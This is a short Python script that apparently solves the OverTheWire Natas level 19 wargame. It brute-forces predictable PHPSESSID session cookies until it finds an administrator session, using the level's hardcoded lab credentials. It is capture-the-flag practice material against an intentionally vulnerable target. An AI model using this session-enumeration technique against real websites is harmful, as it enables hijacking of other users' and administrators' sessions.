import requests

target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
params = dict(username='admin', password='pass')
cookies = dict()

for x in range(10):
    for y in range(10):
        s_id = int(f"3{x}3{y}")
        print("Trying with PHPSESSID = " + str(s_id))
        cookies = dict(PHPSESSID=str(s_id))
        r = requests.get(target, auth=auth, params=params, cookies=cookies)
        if "You are an admin" in r.text:
            print(r.text)
            break
